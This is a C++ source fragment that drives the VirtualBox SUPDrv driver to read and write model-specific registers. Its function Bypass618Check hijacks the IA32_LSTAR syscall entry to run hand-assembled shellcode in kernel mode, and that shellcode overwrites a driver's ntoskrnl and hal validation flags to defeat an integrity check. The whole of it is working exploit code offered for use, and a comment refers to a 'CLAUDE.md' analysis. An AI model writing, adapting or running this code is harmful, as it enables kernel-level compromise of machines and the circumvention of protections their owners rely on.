{
    if (!m_bInitialized) {
        SetError("SUPDrvLoader not initialized");
        return false;
    }

    SUPPAGEFREE pageFree = {};

    pageFree.Hdr.u32Cookie = m_Cookie.u.Out.u32Cookie;
    pageFree.Hdr.u32SessionCookie = m_Cookie.u.Out.u32SessionCookie;
    pageFree.Hdr.cbIn = static_cast<uint32_t>(SUP_IOCTL_PAGE_FREE_SIZE_IN);
    pageFree.Hdr.cbOut = static_cast<uint32_t>(SUP_IOCTL_PAGE_FREE_SIZE_OUT);
    pageFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    pageFree.Hdr.rc = VERR_INTERNAL_ERROR;

    pageFree.u.In.pvR3 = reinterpret_cast<uint64_t>(pvR3);

    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_PAGE_FREE,
        &pageFree,
        pageFree.Hdr.cbIn,
        &pageFree,
        pageFree.Hdr.cbOut,
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();
        SetError("SUP_IOCTL_PAGE_FREE DeviceIoControl failed. Error: %lu", err);
        return false;
    }

    if (pageFree.Hdr.rc != VINF_SUCCESS) {
        SetError("SUP_IOCTL_PAGE_FREE failed with VBox error: %d", pageFree.Hdr.rc);
        return false;
    }

    return true;
}

bool SUPDrvLoader::MsrRead(uint32_t uMsr, uint64_t* puValue, uint32_t idCpu)
{
    if (!m_bInitialized) {
        SetError("SUPDrvLoader not initialized");
        return false;
    }

    if (!puValue) {
        SetError("Invalid puValue parameter");
        return false;
    }

    SUPMSRPROBER msrProber = {};

    msrProber.Hdr.u32Cookie = m_Cookie.u.Out.u32Cookie;
    msrProber.Hdr.u32SessionCookie = m_Cookie.u.Out.u32SessionCookie;
    msrProber.Hdr.cbIn = static_cast<uint32_t>(SUP_IOCTL_MSR_PROBER_SIZE_IN);
    msrProber.Hdr.cbOut = static_cast<uint32_t>(SUP_IOCTL_MSR_PROBER_SIZE_OUT);
    msrProber.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    msrProber.Hdr.rc = VERR_INTERNAL_ERROR;

    msrProber.u.In.enmOp = SUPMSRPROBEROP_READ;
    msrProber.u.In.uMsr = uMsr;
    msrProber.u.In.idCpu = idCpu;

    DbgLog("[SUPDrvLoader::MsrRead] MSR=0x%08X idCpu=%u", uMsr, idCpu);

    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_MSR_PROBER,
        &msrProber,
        msrProber.Hdr.cbIn,
        &msrProber,
        msrProber.Hdr.cbOut,
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();
        SetError("SUP_IOCTL_MSR_PROBER (READ) DeviceIoControl failed. Error: %lu", err);
        return false;
    }

    if (msrProber.Hdr.rc != VINF_SUCCESS) {
        SetError("SUP_IOCTL_MSR_PROBER (READ) failed with VBox error: %d", msrProber.Hdr.rc);
        return false;
    }

    if (msrProber.u.Out.uResults.Read.fGp) {
        SetError("MSR read caused #GP (General Protection fault)");
        return false;
    }

    *puValue = msrProber.u.Out.uResults.Read.uValue;
    DbgLog("[SUPDrvLoader::MsrRead] SUCCESS: value=0x%016llX", *puValue);

    return true;
}

bool SUPDrvLoader::MsrWrite(uint32_t uMsr, uint64_t uValue, uint32_t idCpu)
{
    if (!m_bInitialized) {
        SetError("SUPDrvLoader not initialized");
        return false;
    }

    SUPMSRPROBER msrProber = {};

    msrProber.Hdr.u32Cookie = m_Cookie.u.Out.u32Cookie;
    msrProber.Hdr.u32SessionCookie = m_Cookie.u.Out.u32SessionCookie;
    msrProber.Hdr.cbIn = static_cast<uint32_t>(SUP_IOCTL_MSR_PROBER_SIZE_IN);
    msrProber.Hdr.cbOut = static_cast<uint32_t>(SUP_IOCTL_MSR_PROBER_SIZE_OUT);
    msrProber.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    msrProber.Hdr.rc = VERR_INTERNAL_ERROR;

    msrProber.u.In.enmOp = SUPMSRPROBEROP_WRITE;
    msrProber.u.In.uMsr = uMsr;
    msrProber.u.In.idCpu = idCpu;
    msrProber.u.In.uArgs.Write.uToWrite = uValue;

    DbgLog("[SUPDrvLoader::MsrWrite] MSR=0x%08X value=0x%016llX idCpu=%u",
           uMsr, uValue, idCpu);

    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_MSR_PROBER,
        &msrProber,
        msrProber.Hdr.cbIn,
        &msrProber,
        msrProber.Hdr.cbOut,
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();
        SetError("SUP_IOCTL_MSR_PROBER (WRITE) DeviceIoControl failed. Error: %lu", err);
        return false;
    }

    if (msrProber.Hdr.rc != VINF_SUCCESS) {
        SetError("SUP_IOCTL_MSR_PROBER (WRITE) failed with VBox error: %d", msrProber.Hdr.rc);
        return false;
    }

    if (msrProber.u.Out.uResults.Write.fGp) {
        SetError("MSR write caused #GP (General Protection fault)");
        return false;
    }

    DbgLog("[SUPDrvLoader::MsrWrite] SUCCESS");
    return true;
}

bool SUPDrvLoader::Bypass618Check(uint64_t driverBase)
{
    DbgLog("[SUPDrvLoader::Bypass618Check] Starting -618 bypass for driver at 0x%016llX", driverBase);

    // Global flag offsets from CLAUDE.md analysis:
    // driver_base + 0x4a1a0: ntoskrnl.exe validation (1=valid, 0=failed)
    // driver_base + 0x4a210: hal.dll validation (1=valid, 0=failed)
    constexpr uint64_t NTOSKRNL_FLAG_OFFSET = 0x4a1a0;
    constexpr uint64_t HAL_FLAG_OFFSET = 0x4a210;

    uint64_t pNtoskrnlFlag = driverBase + NTOSKRNL_FLAG_OFFSET;
    uint64_t pHalFlag = driverBase + HAL_FLAG_OFFSET;

    DbgLog("[SUPDrvLoader::Bypass618Check] Flag addresses: ntoskrnl=%016llX hal=%016llX",
           pNtoskrnlFlag, pHalFlag);

    // Step 1: Allocate dual-mapped pages (R3 writable, R0 executable)
    void* pvR3 = nullptr;
    void* pvR0 = nullptr;
    if (!PageAllocEx(1, &pvR3, &pvR0)) {
        SetError("Bypass618Check: PageAllocEx failed - %s", m_LastError.c_str());
        return false;
    }
    DbgLog("[SUPDrvLoader::Bypass618Check] Allocated pages: R3=%p R0=%p", pvR3, pvR0);

    // Step 2: Write shellcode to R3 mapping
    // Shellcode will:
    //   1. Set byte at [pNtoskrnlFlag] = 1
    //   2. Set byte at [pHalFlag] = 1
    //   3. Restore original IA32_LSTAR
    //   4. Jump to original syscall handler
    //
    // We need to save original LSTAR first to embed in shellcode
    uint64_t originalLstar = 0;
    if (!MsrRead(MSR_IA32_LSTAR, &originalLstar)) {
        PageFree(pvR3);
        SetError("Bypass618Check: Failed to read IA32_LSTAR - %s", m_LastError.c_str());
        return false;
    }
    DbgLog("[SUPDrvLoader::Bypass618Check] Original IA32_LSTAR: 0x%016llX", originalLstar);

    // Build shellcode
    // This runs when syscall is executed - we're now in Ring 0!
    //
    // mov byte ptr [pNtoskrnlFlag], 1    ; C6 05 XX XX XX XX 01
    // mov byte ptr [pHalFlag], 1         ; C6 05 XX XX XX XX 01
    // mov ecx, 0xC0000082                ; B9 82 00 00 C0  (MSR_IA32_LSTAR)
    // mov rax, originalLstar             ; 48 B8 XX XX XX XX XX XX XX XX
    // mov rdx, rax                       ; 48 89 C2
    // shr rdx, 32                        ; 48 C1 EA 20
    // wrmsr                              ; 0F 30
    // jmp originalLstar                  ; FF 25 00 00 00 00 + addr
    //
    // But wait - using RIP-relative addressing is tricky. Let me use absolute addressing.

    uint8_t shellcode[] = {
        // Save registers we'll clobber
        0x50,                                     // push rax
        0x51,                                     // push rcx
        0x52,                                     // push rdx

        // mov byte ptr [pNtoskrnlFlag], 1
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, pNtoskrnlFlag
        0xC6, 0x00, 0x01,                         // mov byte ptr [rax], 1

        // mov byte ptr [pHalFlag], 1
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, pHalFlag
        0xC6, 0x00, 0x01,                         // mov byte ptr [rax], 1

        // Restore IA32_LSTAR to original value
        0xB9, 0x82, 0x00, 0x00, 0xC0,             // mov ecx, 0xC0000082 (MSR_IA32_LSTAR)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, originalLstar
        0x48, 0x89, 0xC2,                         // mov rdx, rax
        0x48, 0xC1, 0xEA, 0x20,                   // shr rdx, 32
        0x0F, 0x30,                               // wrmsr

        // Restore registers
        0x5A,                                     // pop rdx
        0x59,                                     // pop rcx
        0x58,                                     // pop rax

        // Jump to original syscall handler
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, originalLstar
        0xFF, 0xE0                                // jmp rax
    };

    // Patch in the addresses
    // Shellcode layout (68 bytes total):
    //   0-2:   push rax/rcx/rdx (3 bytes)
    //   3-12:  mov rax, imm64 #1 - opcode at 3-4, imm64 at 5-12
    //   13-15: mov byte [rax], 1 (3 bytes)
    //   16-25: mov rax, imm64 #2 - opcode at 16-17, imm64 at 18-25
    //   26-28: mov byte [rax], 1 (3 bytes)
    //   29-33: mov ecx, imm32 (5 bytes)
    //   34-43: mov rax, imm64 #3 - opcode at 34-35, imm64 at 36-43
    //   44-46: mov rdx, rax (3 bytes)
    //   47-50: shr rdx, 32 (4 bytes)
    //   51-52: wrmsr (2 bytes)
    //   53-55: pop rdx/rcx/rax (3 bytes)
    //   56-65: mov rax, imm64 #4 - opcode at 56-57, imm64 at 58-65
    //   66-67: jmp rax (2 bytes)
    memcpy(&shellcode[5], &pNtoskrnlFlag, sizeof(pNtoskrnlFlag));   // imm64 #1
    memcpy(&shellcode[18], &pHalFlag, sizeof(pHalFlag));            // imm64 #2
    memcpy(&shellcode[36], &originalLstar, sizeof(originalLstar));  // imm64 #3 (for wrmsr)
    memcpy(&shellcode[58], &originalLstar, sizeof(originalLstar));  // imm64 #4 (for jmp) - FIXED!

    // Copy shellcode to R3 mapping (appears at R0 address for execution)
    memcpy(pvR3, shellcode, sizeof(shellcode));
    DbgLog("[SUPDrvLoader::Bypass618Check] Shellcode written (%zu bytes)", sizeof(shellcode));

    // Step 3: Hijack IA32_LSTAR to point to our shellcode
    uint64_t shellcodeR0 = reinterpret_cast<uint64_t>(pvR0);
    if (!MsrWrite(MSR_IA32_LSTAR, shellcodeR0)) {
        PageFree(pvR3);
        SetError("Bypass618Check: Failed to write IA32_LSTAR - %s", m_LastError.c_str());
        return false;
    }
    DbgLog("[SUPDrvLoader::Bypass618Check] IA32_LSTAR hijacked to 0x%016llX", shellcodeR0);

    // Step 4: Trigger syscall - any syscall will do
    // The shellcode will execute, patch the flags, restore LSTAR, and continue
    DbgLog("[SUPDrvLoader::Bypass618Check] Triggering syscall...");

    // Use GetCurrentProcessId which internally does a syscall
    DWORD pid = GetCurrentProcessId();
    (void)pid;  // Avoid unused warning

    // Step 5: Verify LSTAR was restored (shellcode should have done this)
    uint64_t currentLstar = 0;
    if (!MsrRead(MSR_IA32_LSTAR, &currentLstar)) {
        DbgLog("[SUPDrvLoader::Bypass618Check] WARNING: Could not verify LSTAR restoration");
    } else if (currentLstar == originalLstar) {
        DbgLog("[SUPDrvLoader::Bypass618Check] LSTAR restored to original: 0x%016llX", currentLstar);
    } else {
        DbgLog("[SUPDrvLoader::Bypass618Check] WARNING: LSTAR mismatch! current=0x%016llX original=0x%016llX",
               currentLstar, originalLstar);
        // Manually restore if shellcode failed
        MsrWrite(MSR_IA32_LSTAR, originalLstar);
    }

    // Step 6: Cleanup
    PageFree(pvR3);
    DbgLog("[SUPDrvLoader::Bypass618Check] Pages freed");

    DbgLog("[SUPDrvLoader::Bypass618Check] -618 bypass complete!");
    return true;
}

} // namespace supdrv
